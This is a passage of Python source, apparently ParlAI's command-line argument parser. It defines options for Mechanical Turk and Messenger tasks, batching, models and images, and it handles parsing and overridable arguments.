                            os.path.realpath(__file__)))))
        os.environ['PARLAI_HOME'] = self.parlai_home

        self.add_arg = self.add_argument

        # remember which args were specified on the command line
        self.cli_args = sys.argv
        self.overridable = {}

        if add_parlai_args:
            self.add_parlai_args()
        if add_model_args:
            self.add_model_args()

    def add_parlai_data_path(self, argument_group=None):
        if argument_group is None:
            argument_group = self
        default_data_path = os.path.join(self.parlai_home, 'data')
        argument_group.add_argument(
            '-dp', '--datapath', default=default_data_path,
            help='path to datasets, defaults to {parlai_dir}/data')

    def add_mturk_args(self):
        mturk = self.add_argument_group('Mechanical Turk')
        default_log_path = os.path.join(self.parlai_home, 'logs', 'mturk')
        mturk.add_argument(
            '--mturk-log-path', default=default_log_path,
            help='path to MTurk logs, defaults to {parlai_dir}/logs/mturk')
        mturk.add_argument(
            '-t', '--task',
            help='MTurk task, e.g. "qa_data_collection" or "model_evaluator"')
        mturk.add_argument(
            '-nc', '--num-conversations', default=1, type=int,
            help='number of conversations you want to create for this task')
        mturk.add_argument(
            '--unique', dest='unique_worker', default=False,
            action='store_true',
            help='enforce that no worker can work on your task twice')
        mturk.add_argument(
            '--unique-qual-name', dest='unique_qual_name',
            default=None, type=str,
            help='qualification name to use for uniqueness between HITs')
        mturk.add_argument(
            '-r', '--reward', default=0.05, type=float,
            help='reward for each worker for finishing the conversation, '
                 'in US dollars')
        mturk.add_argument(
            '--sandbox', dest='is_sandbox', action='store_true',
            help='submit the HITs to MTurk sandbox site')
        mturk.add_argument(
            '--live', dest='is_sandbox', action='store_false',
            help='submit the HITs to MTurk live site')
        mturk.add_argument(
            '--debug', dest='is_debug', action='store_true',
            help='print and log all server interactions and messages')
        mturk.add_argument(
            '--verbose', dest='verbose', action='store_true',
            help='print all messages sent to and from Turkers')
        mturk.add_argument(
            '--hard-block', dest='hard_block', action='store_true',
            default=False,
            help='Hard block disconnecting Turkers from all of your HITs')
        mturk.add_argument(
            '--log-level', dest='log_level', type=int, default=20,
            help='importance level for what to put into the logs. the lower '
                 'the level the more that gets logged. values are 0-50')
        mturk.add_argument(
            '--block-qualification', dest='block_qualification', default='',
            help='Qualification to use for soft blocking users. By default '
                 'turkers are never blocked, though setting this will allow '
                 'you to filter out turkers that have disconnected too many '
                 'times on previous HITs where this qualification was set.')
        mturk.add_argument(
            '--count-complete', dest='count_complete',
            default=False, action='store_true',
            help='continue until the requested number of conversations are '
                 'completed rather than attempted')
        mturk.add_argument(
            '--allowed-conversations', dest='allowed_conversations',
            default=0, type=int,
            help='number of concurrent conversations that one mturk worker '
                 'is able to be involved in, 0 is unlimited')
        mturk.add_argument(
            '--max-connections', dest='max_connections',
            default=30, type=int,
            help='number of HITs that can be launched at the same time, 0 is '
                 'unlimited.'
        )
        mturk.add_argument(
            '--min-messages', dest='min_messages',
            default=0, type=int,
            help='number of messages required to be sent by MTurk agent when '
                 'considering whether to approve a HIT in the event of a '
                 'partner disconnect. I.e. if the number of messages '
                 'exceeds this number, the turker can submit the HIT.'
        )
        mturk.add_argument(
            '--local', dest='local', default=False, action='store_true',
            help='Run the server locally on this server rather than setting up'
                 ' a heroku server.'
        )

        mturk.set_defaults(is_sandbox=True)
        mturk.set_defaults(is_debug=False)
        mturk.set_defaults(verbose=False)

    def add_messenger_args(self):
        messenger = self.add_argument_group('Facebook Messenger')
        messenger.add_argument(
            '--debug', dest='is_debug', action='store_true',
            help='print and log all server interactions and messages')
        messenger.add_argument(
            '--verbose', dest='verbose', action='store_true',
            help='print all messages sent to and from Turkers')
        messenger.add_argument(
            '--log-level', dest='log_level', type=int, default=20,
            help='importance level for what to put into the logs. the lower '
                 'the level the more that gets logged. values are 0-50')
        messenger.add_argument(
            '--force-page-token', dest='force_page_token', action='store_true',
            help='override the page token stored in the cache for a new one')
        messenger.add_argument(
            '--password', dest='password', type=str, default=None,
            help='Require a password for entry to the bot')
        messenger.add_argument(
            '--local', dest='local', action='store_true', default=False,
            help='Run the server locally on this server rather than setting up'
                 ' a heroku server.'
        )

        messenger.set_defaults(is_debug=False)
        messenger.set_defaults(verbose=False)

    def add_parlai_args(self, args=None):
        default_downloads_path = os.path.join(self.parlai_home, 'downloads')
        parlai = self.add_argument_group('Main ParlAI Arguments')
        parlai.add_argument(
            '-t', '--task',
            help='ParlAI task(s), e.g. "babi:Task1" or "babi,cbt"')
        parlai.add_argument(
            '--download-path', default=default_downloads_path,
            help='path for non-data dependencies to store any needed files.'
                 'defaults to {parlai_dir}/downloads')
        parlai.add_argument(
            '-dt', '--datatype', default='train',
            choices=['train', 'train:stream', 'train:ordered',
                     'train:ordered:stream', 'train:stream:ordered',
                     'valid', 'valid:stream', 'test', 'test:stream'],
            help='choose from: train, train:ordered, valid, test. to stream '
                 'data add ":stream" to any option (e.g., train:stream). '
                 'by default: train is random with replacement, '
                 'valid is ordered, test is ordered.')
        parlai.add_argument(
            '-im', '--image-mode', default='raw', type=str,
            help='image preprocessor to use. default is "raw". set to "none" '
                 'to skip image loading.')
        parlai.add_argument(
            '-nt', '--numthreads', default=1, type=int,
            help='number of threads. If batchsize set to 1, used for hogwild; '
                 'otherwise, used for number of threads in threadpool loading,'
                 ' e.g. in vqa')
        parlai.add_argument(
            '--hide-labels', default=False, type='bool',
            help='default (False) moves labels in valid and test sets to the '
                 'eval_labels field. If True, they are hidden completely.')
        batch = self.add_argument_group('Batching Arguments')
        batch.add_argument(
            '-bs', '--batchsize', default=1, type=int,
            help='batch size for minibatch training schemes')
        batch.add_argument('-bsrt', '--batch-sort', default=True, type='bool',
                           help='If enabled (default True), create batches by '
                                'flattening all episodes to have exactly one '
                                'utterance exchange and then sorting all the '
                                'examples according to their length. This '
                                'dramatically reduces the amount of padding '
                                'present after examples have been parsed, '
                                'speeding up training.')
        batch.add_argument('-clen', '--context-length', default=-1, type=int,
                           help='Number of past utterances to remember when '
                                'building flattened batches of data in multi-'
                                'example episodes.')
        batch.add_argument('-incl', '--include-labels',
                           default=True, type='bool',
                           help='Specifies whether or not to include labels '
                                'as past utterances when building flattened '
                                'batches of data in multi-example episodes.')
        self.add_parlai_data_path(parlai)

    def add_model_args(self):
        """Add arguments related to models such as model files."""
        model_args = self.add_argument_group('ParlAI Model Arguments')
        model_args.add_argument(
            '-m', '--model', default=None,
            help='the model class name. can match parlai/agents/<model> for '
                 'agents in that directory, or can provide a fully specified '
                 'module for `from X import Y` via `-m X:Y` '
                 '(e.g. `-m parlai.agents.seq2seq.seq2seq:Seq2SeqAgent`)')
        model_args.add_argument(
            '-mf', '--model-file', default=None,
            help='model file name for loading and saving models')
        model_args.add_argument(
            '--dict-class',
            help='the class of the dictionary agent uses')

    def add_model_subargs(self, model):
        """Add arguments specific to a particular model."""
        agent = get_agent_module(model)
        try:
            if hasattr(agent, 'add_cmdline_args'):
                agent.add_cmdline_args(self)
        except argparse.ArgumentError:
            # already added
            pass
        try:
            if hasattr(agent, 'dictionary_class'):
                s = class2str(agent.dictionary_class())
                self.set_defaults(dict_class=s)
        except argparse.ArgumentError:
            # already added
            pass

    def add_task_args(self, task):
        """Add arguments specific to the specified task."""
        for t in ids_to_tasks(task).split(','):
            agent = get_task_module(t)
            try:
                if hasattr(agent, 'add_cmdline_args'):
                    agent.add_cmdline_args(self)
            except argparse.ArgumentError:
                # already added
                pass

    def add_image_args(self, image_mode):
        """Add additional arguments for handling images."""
        try:
            parlai = self.add_argument_group('ParlAI Image Preprocessing Arguments')
            parlai.add_argument('--image-size', type=int, default=256,
                                help='resizing dimension for images')
            parlai.add_argument('--image-cropsize', type=int, default=224,
                                help='crop dimension for images')
        except argparse.ArgumentError:
            # already added
            pass


    def add_extra_args(self, args=None):
        """Add more args depending on how known args are set."""
        parsed = vars(self.parse_known_args(nohelp=True)[0])                    

        # find which image mode specified if any, and add additional arguments
        image_mode = parsed.get('image_mode', None)
        if image_mode is not None and image_mode != 'none':
            self.add_image_args(image_mode)

        # find which task specified if any, and add its specific arguments
        task = parsed.get('task', None)
        if task is not None:
            self.add_task_args(task)
        evaltask = parsed.get('evaltask', None)
        if evaltask is not None:
            self.add_task_args(evaltask)

        # find which model specified if any, and add its specific arguments
        model = parsed.get('model', None)
        if model is not None:
            self.add_model_subargs(model)

        # reset parser-level defaults over any model-level defaults
        try:
            self.set_defaults(**self._defaults)
        except AttributeError:
            raise RuntimeError('Please file an issue on github that argparse '
                               'got an attribute error when parsing.')


    def parse_known_args(self, args=None, namespace=None, nohelp=False):
        """Custom parse known args to ignore help flag."""
        if nohelp:
            # ignore help
            args = sys.argv[1:] if args is None else args
            args = [a for a in args if a != '-h' and a != '--help']
        return super().parse_known_args(args, namespace)


    def parse_args(self, args=None, namespace=None, print_args=True):
        """Parses the provided arguments and returns a dictionary of the
        ``args``. We specifically remove items with ``None`` as values in order
        to support the style ``opt.get(key, default)``, which would otherwise
        return ``None``.
        """
        self.add_extra_args(args)
        self.args = super().parse_args(args=args)
        self.opt = vars(self.args)

        # custom post-parsing
        self.opt['parlai_home'] = self.parlai_home
        if 'batchsize' in self.opt and self.opt['batchsize'] <= 1:
            # hide batch options
            self.opt.pop('batch_sort', None)
            self.opt.pop('context_length', None)

        # set environment variables
        if self.opt.get('download_path'):
            os.environ['PARLAI_DOWNPATH'] = self.opt['download_path']
        if self.opt.get('datapath'):
            os.environ['PARLAI_DATAPATH'] = self.opt['datapath']

        # map filenames that start with 'models:' to point to the model zoo dir
        if self.opt.get('model_file') is not None:
            self.opt['model_file'] = modelzoo_path(self.opt.get('datapath'),
                                                   self.opt['model_file'])
        if self.opt.get('dict_file') is not None:
            self.opt['dict_file'] = modelzoo_path(self.opt.get('datapath'),
                                                  self.opt['dict_file'])

        # set all arguments specified in commandline as overridable
        option_strings_dict = {}
        store_true = []
        store_false = []
        for group in self._action_groups:
            for a in group._group_actions:
                if hasattr(a, 'option_strings'):
                    for option in a.option_strings:
                        option_strings_dict[option] = a.dest
                        if '_StoreTrueAction' in str(type(a)):
                            store_true.append(option)
                        elif '_StoreFalseAction' in str(type(a)):
                            store_false.append(option)

        for i in range(len(self.cli_args)):
            if self.cli_args[i] in option_strings_dict:
                if self.cli_args[i] in store_true:
                    self.overridable[option_strings_dict[self.cli_args[i]]] = \
                        True
                elif self.cli_args[i] in store_false:
                    self.overridable[option_strings_dict[self.cli_args[i]]] = \
                        False
                else:
                    if i < (len(self.cli_args) - 1) and \
                            self.cli_args[i+1][0] != '-':
                        self.overridable[option_strings_dict[self.cli_args[i]]] = \
                            self.cli_args[i+1]
        self.opt['override'] = self.overridable

        if print_args:
            self.print_args()

        return self.opt

    def print_args(self):
        """Print out all the arguments in this parser."""
        if not self.opt:
            self.parse_args(print_args=False)
        values = {}
        for key, value in self.opt.items():
            values[str(key)] = str(value)
        for group in self._action_groups:
            group_dict = {
                a.dest: getattr(self.args, a.dest, None)
                for a in group._group_actions
            }
            namespace = argparse.Namespace(**group_dict)
            count = 0
            for key in namespace.__dict__:
                if key in values:
                    if count == 0:
                        print('[ ' + group.title + ': ] ')
                    count += 1
                    print('[  ' + key + ': ' + values[key] + ' ]')

    def set_params(self, **kwargs):
        """Set overridable kwargs."""
        self.set_defaults(**kwargs)
        for k, v in kwargs.items():
            self.overridable[k] = v


